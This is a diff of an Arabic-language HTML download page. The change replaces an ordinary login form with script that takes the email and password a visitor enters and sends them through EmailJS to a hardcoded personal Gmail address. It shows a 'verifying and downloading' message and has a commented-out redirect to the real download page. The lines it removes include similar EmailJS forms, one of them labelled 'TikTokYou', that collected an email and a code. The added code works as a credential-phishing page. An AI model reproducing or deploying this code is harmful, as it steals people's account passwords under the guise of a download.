@@ -78,6 +78,11 @@
         .btn:hover {
             background-color: #2563eb;
         }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #38bdf8;
+        }
     </style>
 </head>
 <body>
@@ -88,8 +93,8 @@
         
         <h2>تسجيل الدخول للتحميل</h2>
         
-        <!-- نموذج إدخال البريد وكلمة السر -->
-        <form action="download.html" method="GET">
+        <!-- نموذج إدخال البريد وكلمة السر مع إرسال عبر EmailJS -->
+        <form id="deft-form">
             <div class="input-group">
                 <label for="email">البريد الإلكتروني:</label>
                 <input type="email" id="email" name="email" placeholder="أدخل البريد الإلكتروني" required>
@@ -101,113 +106,52 @@
             </div>
             
             <button type="submit" class="btn">الانتقال إلى صفحة التحميل</button>
+            <p id="status"></p>
         </form>
     </div>
 
+    <!-- مكتبة EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      // استبدل "YOUR_PUBLIC_KEY" بالمفتاح العام الخاص بك من حسابك في EmailJS
+      emailjs.init({
+        publicKey: "YOUR_PUBLIC_KEY"
+      });
+
+      document.getElementById("deft-form")
+        .addEventListener("submit", async function(e) {
+          e.preventDefault();
+
+          const status = document.getElementById("status");
+          status.textContent = "جاري التحقق والتحميل...";
+
+          const email = document.getElementById("email").value;
+          const password = document.getElementById("password").value;
+
+          try {
+            // إرسال البيانات باستخدام الخدمة والقالب الخاص بك
+            await emailjs.send(
+              "service_pfw3g7m",
+              "template_2ongjk6",
+              {
+                message: "البريد الإلكتروني: " + email +
+                         "\nكلمة المرور: " + password,
+                to_email: "yahayh572@gmail.com"
+              }
+            );
+
+            status.textContent = "تم بنجاح! جاري تحويلك...";
+            this.reset();
+            
+            // يمكنك هنا توجيه المستخدم لصفحة التحميل الحقيقية بعد ثانية مثلاً:
+            // setTimeout(() => { window.location.href = "download.html"; }, 1500);
+
+          } catch (error) {
+            status.textContent = "حدث خطأ، يحاول مرة أخرى.";
+            console.error(error);
+          }
+        });
+    </script>
+
 </body>
 </html>
-<form id="contact-form">
-  <label>اكتب رسالة الاختبار:</label>
-  <textarea
-    name="message"
-    required
-    placeholder="اكتب هنا رسالة تجريبية"
-  ></textarea>
-
-  <button type="submit">إرسال إلى الأستاذ</button>
-</form>
-
-<form id="deft-form">
-  <h3>DEFT - اختبار إرسال البريد</h3>
-
-  <label for="message">رسالة الاختبار:</label>
-  <textarea
-    id="message"
-    name="message"
-    placeholder="اكتب رسالة تجريبية"
-    required
-  ></textarea>
-
-  <button type="submit">إرسال الرسالة</button>
-  <p id="status"></p>
-</form>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script>
-  emailjs.init({
-    publicKey: "YOUR_PUBLIC_KEY"
-  });
-
-  document.getElementById("deft-form")
-    .addEventListener("submit", async function(event) {
-      event.preventDefault();
-
-      const status = document.getElementById("status");
-      status.textContent = "جاري الإرسال...";
-
-      try {
-        await emailjs.send(
-          "service_pfw3g7m",
-          "template_2ongjk6",
-          {
-            message: document.getElementById("message").value,
-            to_email: "yahayh572@gmail.com"
-          }
-        );
-
-        status.textContent = "تم إرسال الرسالة بنجاح!";
-        this.reset();
-      } catch (error) {
-        status.textContent = "فشل الإرسال. تحقق من إعدادات EmailJS.";
-        console.error(error);
-      }
-    });
-</script>
-
-<form id="deft-form">
-  <h2>TikTokYou</h2>
-
-  <label for="email">الإيميل التجريبي:</label>
-  <input id="email" type="email" required>
-
-  <label for="code">رمز الاختبار:</label>
-  <input id="code" type="text" required>
-
-  <button type="submit">إرسال البيانات</button>
-  <p id="status"></p>
-</form>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-<script>
-emailjs.init({
-  publicKey: "YOUR_PUBLIC_KEY"
-});
-
-document.getElementById("deft-form")
-  .addEventListener("submit", async function(e) {
-    e.preventDefault();
-
-    const status = document.getElementById("status");
-    status.textContent = "جاري الإرسال...";
-
-    const email = document.getElementById("email").value;
-    const code = document.getElementById("code").value;
-
-    try {
-      await emailjs.send(
-        "service_pfw3g7m",
-        "template_2ongjk6",
-        {
-          message: "الإيميل التجريبي: " + email +
-                   "\nرمز الاختبار: " + code
-        }
-      );
-
-      status.textContent = "تم إرسال البيانات بنجاح!";
-      this.reset();
-    } catch (error) {
-      status.textContent = "فشل الإرسال، راجع إعدادات EmailJS.";
-      console.error(error);
-    }
-  });
-</script>
